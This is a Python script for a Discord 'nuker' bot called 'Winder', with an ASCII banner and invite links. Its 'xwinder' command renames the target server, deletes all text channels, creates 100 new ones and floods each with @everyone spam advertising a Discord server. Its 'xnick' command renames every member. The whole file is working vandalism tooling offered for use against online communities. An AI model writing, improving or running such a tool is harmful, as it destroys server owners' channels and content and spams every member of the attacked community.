import colorama
from colorama import Fore
import os
import time
import aiohttp
import datetime
current_time = datetime.datetime.now()

import discord
from discord.ext import commands

import asyncio

def banner(): 
    print(f'''
        {Fore.MAGENTA}                            █     █░██▓███▄    █▓█████▄▓█████ ██▀███  
        {Fore.MAGENTA}                            ▓█░ █ ░█▓██▒██ ▀█   █▒██▀ ██▓█   ▀▓██ ▒ ██▒
        {Fore.MAGENTA}                            ▒█░ █ ░█▒██▓██  ▀█ ██░██   █▒███  ▓██ ░▄█ ▒
        {Fore.MAGENTA}                            ░█░ █ ░█░██▓██▒  ▐▌██░▓█▄   ▒▓█  ▄▒██▀▀█▄  
        {Fore.MAGENTA}                            ░░██▒██▓░██▒██░   ▓██░▒████▓░▒████░██▓ ▒██▒
        {Fore.MAGENTA}                            ░ ▓░▒ ▒ ░▓ ░ ▒░   ▒ ▒ ▒▒▓  ▒░░ ▒░ ░ ▒▓ ░▒▓░
        {Fore.MAGENTA}                            ▒ ░ ░  ▒ ░ ░░   ░ ▒░░ ▒  ▒ ░ ░  ░ ░▒ ░ ▒░
        {Fore.MAGENTA}                            ░   ░  ▒ ░  ░   ░ ░ ░ ░  ░   ░    ░░   ░ 
        {Fore.MAGENTA}                                ░    ░          ░   ░      ░  ░  ░     
        {Fore.MAGENTA}                                               ░          

        {Fore.MAGENTA}                                          Made by linux
        {Fore.MAGENTA}                                      discord.gg/vQQejKK8B4
    ''')

serverName = "nuked by linux"
channelName = "nuked by linux"
spamMsg = "@everyone @here [.gg/winder] (https://discord.gg/Am4BMksGmE)"
newNick = "bomba na"

def runBot(botToken):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='x', intents=intents)

    @bot.event
    async def on_ready():
        print(f"Logged in as {bot.user.name} ({bot.user.id})")

    @bot.command(name='cmd')
    async def cmd(ctx):
        embed = discord.Embed(
            title="Winder Commands",
            description="List of all available commands.",
            color=discord.Color.green()
        )

        embed.add_field(name="xcmd", value="show available commands.")
        embed.add_field(name="xwinder", value="nuclear weapon.")
        embed.add_field(name="xnick", value="change all members nickname.")

        await ctx.author.send(embed=embed)

    @bot.command(name='winder')
    async def winder(ctx):
        if ctx.author.guild_permissions.manage_guild:
            try:
                # Change server name
                await ctx.guild.edit(name=serverName)
                print(f"{Fore.RED}[{current_time}] {Fore.GREEN}Server name changed to: {serverName}")

                async def delete_channel(channel):
                    try:
                        return channel.name, await channel.delete()
                    except discord.Forbidden:
                        print(f"{Fore.RED}[{current_time}] {Fore.RED}I don't have the permission to delete channels.")
                        return channel.name, None

                deleted_channels = await asyncio.gather(*[delete_channel(channel) for channel in ctx.guild.text_channels])

                # Filter out successfully deleted channels
                deleted_channels = [channel_name for channel_name, result in deleted_channels if result]

                # Create new text channels and send messages
                async with aiohttp.ClientSession() as session:
                    created_channels = []  # Reset the created_channels list
                    tasks = [create_and_send_messages(session, ctx.guild, channelName, spamMsg, created_channels) for _ in range(100)]
                    await asyncio.gather(*tasks)

                    print(f"{Fore.RED}[{current_time}] {Fore.GREEN}Deleted channels: {', '.join(deleted_channels)}")
                    print(f"{Fore.RED}[{current_time}] {Fore.GREEN}Created channels: {', '.join(created_channels)}")

            except discord.Forbidden:
                print(f"{Fore.RED}[{current_time}] {Fore.RED}I don't have the permission to manage the server.")
        else:
            print(f"{Fore.RED}You don't have the required permissions to manage channels.")


    async def create_and_send_messages(session, guild, channel_name, message, created_channels):
        try:
            new_channel = await guild.create_text_channel(channel_name)
            created_channels.append(new_channel.name)  # Track the name of the created channel
            print(f"{Fore.RED}[{current_time}] {Fore.GREEN}Channel created - {new_channel.name}")

            # Send message to the new channel
            await send_message_async(session, new_channel.id, message)
            print(f"{Fore.RED}[{current_time}] {Fore.GREEN}Message sent to : {new_channel.name} - {message}")

        except discord.Forbidden:
            print(f"{Fore.RED}[{current_time}] {Fore.RED}I don't have the permission to create channels.")
        except Exception as e:
            print(f"{Fore.RED}[{current_time}] {Fore.RED}An error occurred: {e}")

    async def send_message_async(session, channel_id, message):
        url = f'https://discord.com/api/v10/channels/{channel_id}/messages'
        headers = {
            'Authorization': f'Bot {botToken}',
            'Content-Type': 'application/json'
        }
        data = {
            'content': message
        }

        async with session.post(url, json=data, headers=headers) as response:
            if response.status != 200:
                print(f"{Fore.RED}[{current_time}] {Fore.RED}Failed to send message to channel {channel_id}. Status: {response.status}")

    @bot.command(name='nick')
    async def nick(ctx):
        if ctx.author.guild_permissions.manage_guild:
            try:
                for member in ctx.guild.members:
                    await member.edit(nick=newNick)

                    print(f"{Fore.RED}[{current_time}] {Fore.GREEN}nickname of {member.id} changed to {newNick} by {bot.user.name} ({bot.user.id}).")

            except discord.Forbidden:
                print(f"{Fore.RED}You don't have the permission to manage nicknames.")
        else:
            print(f"{Fore.RED}You don't have the required permissions to manage nicknames.")

    bot.run(botToken)

if __name__ == "__main__":
    os.system('cls')
    banner()
    botToken = input(f"{Fore.MAGENTA}token >> ")
    os.system('cls')
    banner()

    runBot(botToken)
